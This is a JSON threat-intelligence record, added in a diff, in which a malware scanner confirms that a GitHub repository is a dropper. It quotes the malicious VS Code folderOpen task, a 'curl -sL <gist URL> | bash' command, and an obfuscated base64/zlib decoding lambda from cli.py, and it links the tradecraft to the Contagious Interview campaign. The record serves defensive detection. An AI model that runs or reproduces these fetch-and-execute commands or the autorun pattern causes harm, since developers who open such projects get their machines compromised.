@@ -1,0 +1,81 @@
+{
+  "finding": {
+    "key": "repository:khamid-v2022/auto-stacking",
+    "kind": "repository",
+    "id": "khamid-v2022/auto-stacking",
+    "url": "https://github.com/Khamid-v2022/Auto-Stacking",
+    "registry": "github",
+    "owner": "khamid-v2022",
+    "status": "confirmed",
+    "confidence": "auto",
+    "score": 8,
+    "detection_method": "signature_match",
+    "attribution": "",
+    "campaign_id": "",
+    "rules": "install_hook/vscode-autorun; code_execution/py-dyn",
+    "evidence_locations": ".cursor/tasks.json:0; cli.py:554; core/analyzer.py:59",
+    "c2_hosts": "",
+    "iocs": "https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh; curl -sL https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh | bash; .cursor/tasks.json",
+    "matched_signatures": "folderOpen curl filename:tasks.json; folderOpen powershell filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['folderOpen curl filename:tasks.json', 'folderOpen powershell filename:tasks.json'] | Tier-2 confirmed (bash score 8)",
+    "osm_status": "not_submitted",
+    "osm_threat_id": "",
+    "first_seen": "hunt-20260923T001603Z",
+    "last_seen": "hunt-20260923T001603Z",
+    "evidence_file": "repositories/khamid-v2022_auto-stacking.json",
+    "reviewer_decision": "",
+    "notes": ""
+  },
+  "evidence": [
+    {
+      "file": ".cursor/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "bash -c curl -sL https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh | bash bash -c curl -sL https://gist.githubusercontent.com/cuda-toolki"
+    },
+    {
+      "file": ".cursor/tasks.json",
+      "line": 0,
+      "category": "install_hook",
+      "rule": "vscode-autorun",
+      "snippet": "bash -c curl -sL https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh | bash bash -c curl -sL https://gist.githubusercontent.com/cuda-toolki"
+    },
+    {
+      "file": "cli.py",
+      "line": 554,
+      "category": "code_execution",
+      "rule": "py-dyn",
+      "snippet": "tao_config_token = lambda tao_data: __import__('zlib').decompress(__import__('base64').b64decode(tao_data[::-1]))"
+    },
+    {
+      "file": "core/analyzer.py",
+      "line": 59,
+      "category": "code_execution",
+      "rule": "py-dyn",
+      "snippet": "_cli_module = __import__('cli', fromlist=['_initialize_runtime'])"
+    }
+  ],
+  "commit_sha": "a4b68f931150b5b77c4550c9ed9794057ed61e61",
+  "osm_report": {
+    "report_type": "repository",
+    "resource_identifier": "https://github.com/khamid-v2022/auto-stacking",
+    "version_info": "all",
+    "threat_description": "Git Warden confirmed this repository as malicious by static analysis of its source code. The code was read, never executed. The malicious code sits in the file .cursor/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. No legitimate project ships code like this. The repository was either compromised or purpose-built to deliver malware to anyone who clones or installs it. The evidence references link the exact file and line of each finding, and the payload description names every detection rule that fired, so a reviewer can open the repository and verify each one independently. Git Warden found this repository by searching GitHub for code that matches a confirmed malware signature: folderOpen curl filename:tasks.json; folderOpen powershell filename:tasks.json. The delivery method, a .vscode/tasks.json task that automatically runs a remote shell command the moment the repository is opened in VS Code, matches the DPRK-attributed 'Contagious Interview' campaign, in which fake recruiters lure developers into opening a coding-task repository that silently executes a first-stage downloader. Attribution: the tradecraft is consistent with North Korea, but a single signal is a lead rather than an attribution, so we do not attribute it on this evidence alone. The evidence behind this is: (1) Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun.",
+    "payload_description": "The malicious payload sits in .cursor/tasks.json. The code runs automatically from a Visual Studio Code task configured to trigger on folderOpen. Nothing has to be installed, built, or clicked. Opening the project folder in the editor is enough to run the attacker's command. The task fetches a remote script and pipes it straight into a shell, with a separate payload selected for macOS, Linux and Windows. It also carries a presentation block that sets reveal to never and echo to false and closes the panel afterwards, which hides the terminal so the victim never sees the command run. Suppressing output next to a fetch and pipe has no legitimate use and shows the intent is concealment. Detection rules that fired in this repository: code_execution/py-dyn (2 files), install_hook/vscode-autorun (1 file).",
+    "publisher": "khamid-v2022",
+    "severity_level": "critical",
+    "tags": [
+      "supply-chain",
+      "github-repo",
+      "dprk-consistent-tradecraft",
+      "vscode-folderopen-autorun",
+      "dropper"
+    ],
+    "evidence_references": "https://github.com/khamid-v2022/auto-stacking/blob/a4b68f931150b5b77c4550c9ed9794057ed61e61/.cursor/tasks.json\nhttps://github.com/khamid-v2022/auto-stacking/blob/a4b68f931150b5b77c4550c9ed9794057ed61e61/cli.py#L554\nhttps://github.com/khamid-v2022/auto-stacking/blob/a4b68f931150b5b77c4550c9ed9794057ed61e61/core/analyzer.py#L59",
+    "verified_iocs": "https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh\ncurl -sL https://gist.githubusercontent.com/cuda-toolkit/0959deda4982736d1c1647cff354c665/raw/metal_pytorch_sim_v2.3.0.sh | bash\n.cursor/tasks.json",
+    "contributors": [],
+    "first_seen": "2026-09-23T00:16:03Z",
+    "last_seen": "2026-09-23T00:16:03Z"
+  }
+}
